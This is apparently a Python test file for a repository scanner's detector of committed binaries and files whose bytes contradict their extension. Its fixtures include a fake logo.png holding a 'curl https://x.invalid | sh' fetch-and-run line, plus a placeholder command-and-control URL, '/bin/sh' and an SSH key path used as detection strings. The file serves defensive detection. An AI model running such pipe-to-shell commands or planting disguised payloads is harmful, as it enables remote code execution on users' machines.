"""Committed binaries, and files whose bytes contradict their name.

Every other detector reads source. These tests are about the files that have
none, where the questions worth asking are what format this is, whether it
belongs where it sits, and whether the name agrees with the content.

The severity split carries most of the design: a vendored library is a note and
a binary in a scripts directory is a finding, and the difference is context
rather than format.
"""

from __future__ import annotations

from cordon_scanner.core.config import Config
from cordon_scanner.core.content import FileContent
from cordon_scanner.core.models import Category, Severity
from cordon_scanner.detect.base import FileUnit, ScanContext
from cordon_scanner.detect.binary import BinaryDetector
from cordon_scanner.rules.loader import RuleLoader, RuleSet

ELF = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32


def findings_for(path: str, raw: bytes, *, hooks: tuple[str, ...] = ()) -> list:
    ctx = ScanContext(
        config=Config.default(),
        rules=RuleSet(RuleLoader.load_builtin()),
        install_hook_paths=frozenset(hooks),
    )
    unit = FileUnit(content=FileContent.from_bytes(path, raw), language=None)
    return list(BinaryDetector().inspect(unit, ctx))


def ids_for(path: str, raw: bytes, **kwargs) -> list[str]:
    return [f.rule_id for f in findings_for(path, raw, **kwargs)]


class TestIdentification:
    def test_an_elf_is_recognised(self) -> None:
        found = BinaryDetector.identify(ELF)
        assert found is not None
        assert found.executable

    def test_a_png_is_not_an_executable(self) -> None:
        found = BinaryDetector.identify(PNG)
        assert found is not None
        assert not found.executable

    def test_text_is_not_a_format(self) -> None:
        assert BinaryDetector.identify(b"const x = 1;\n") is None


class TestContext:
    """The format is the same; where it sits is what changes."""

    def test_a_binary_in_a_scripts_directory_is_a_finding(self) -> None:
        found = findings_for("scripts/helper", ELF)
        assert [f.rule_id for f in found] == ["SUSPECT.BINARY.EXECUTABLE_PATH.001"]
        assert found[0].severity is Severity.HIGH

    def test_a_binary_named_by_an_install_hook_is_a_finding(self) -> None:
        found = findings_for("tool", ELF, hooks=("tool",))
        assert found[0].rule_id == "SUSPECT.BINARY.EXECUTABLE_PATH.001"

    def test_a_vendored_library_is_a_note(self) -> None:
        """Vendored native libraries and prebuilt fixtures are ordinary in a
        great many repositories. Calling each of them suspicious is how a
        reader learns to skip this detector's output."""
        found = findings_for("vendor/libexample.so", ELF)
        assert found[0].rule_id == "POLICY.BINARY.COMMITTED.001"
        assert found[0].severity is Severity.LOW
        assert found[0].category is Category.POLICY

    def test_a_shell_script_is_source_and_not_reported(self) -> None:
        """Every content rule already reads it. Reporting it here would double
        every script in every repository."""
        assert ids_for("scripts/build.sh", b"#!/bin/sh\necho hi\n") == []


class TestPolyglot:
    def test_a_png_that_is_a_script(self) -> None:
        found = findings_for("logo.png", b"#!/bin/sh\ncurl https://x.invalid | sh\n")
        assert "SUSPECT.POLYGLOT.MISMATCH.001" in [f.rule_id for f in found]

    def test_a_png_that_is_a_zip(self) -> None:
        assert "SUSPECT.POLYGLOT.MISMATCH.001" in ids_for("logo.png", b"PK\x03\x04rest")

    def test_a_real_png_is_not_a_polyglot(self) -> None:
        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in ids_for("logo.png", PNG)

    def test_a_source_extension_promises_nothing(self) -> None:
        """A `.py` file has no required first bytes, and most have no shebang.
        Treating the extension as a promise reported every Python file in the
        benign corpus as a forgery."""
        assert ids_for("app.py", b"import os\n") == []
        assert ids_for("app.py", b"#!/usr/bin/env python3\nimport os\n") == []

    def test_a_shared_extension_is_not_a_mismatch(self) -> None:
        """`.o` is both ELF and Mach-O; `.jar` is a ZIP."""
        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in ids_for("obj.o", ELF)
        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in ids_for("lib.jar", b"PK\x03\x04x")

    def test_an_extensionless_file_is_not_a_mismatch(self) -> None:
        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in ids_for("Makefile", b"all:\n\tgcc x.c\n")


class TestContent:
    def test_a_packer_signature_is_reported(self) -> None:
        assert "SUSPECT.BINARY.PACKED.001" in ids_for("vendor/x.so", ELF + b"UPX!")

    def test_interesting_strings_are_reported_by_kind(self) -> None:
        raw = ELF + b"https://c2.invalid/beacon\x00/bin/sh\x00.ssh/id_rsa\x00"
        found = [f for f in findings_for("vendor/x.so", raw) if f.rule_id.endswith("STRINGS.001")]
        assert found
        assert "a URL" in found[0].message

    def test_the_strings_themselves_are_never_emitted(self) -> None:
        """A URL in a committed binary can be a licence link or a
        command-and-control address, and this finding travels into CI logs and
        pull-request comments. The same discipline as the secret detector: say
        a URL is present, leave reading it to somebody holding the file."""
        raw = ELF + b"https://c2.invalid/beacon\x00"
        for finding in findings_for("vendor/x.so", raw):
            assert "c2.invalid" not in finding.message
            assert "c2.invalid" not in (finding.evidence.snippet or "")

    def test_content_checks_do_not_depend_on_the_header(self) -> None:
        """`is_binary` is anchored at offset zero by design, so prepending a
        comment stops a payload being identified as an executable. It does not
        stop it containing what it contained, and the file must not go quiet."""
        raw = b"/* \x00 */\n" + ELF + b"https://c2.invalid/x\x00/bin/sh\x00UPX!"
        found = ids_for("helper", raw)
        assert "SUSPECT.BINARY.STRINGS.001" in found
        assert "SUSPECT.BINARY.PACKED.001" in found

    def test_ordinary_text_is_not_examined_for_strings(self) -> None:
        assert ids_for("notes.md", b"See https://example.com and run /bin/sh\n") == []
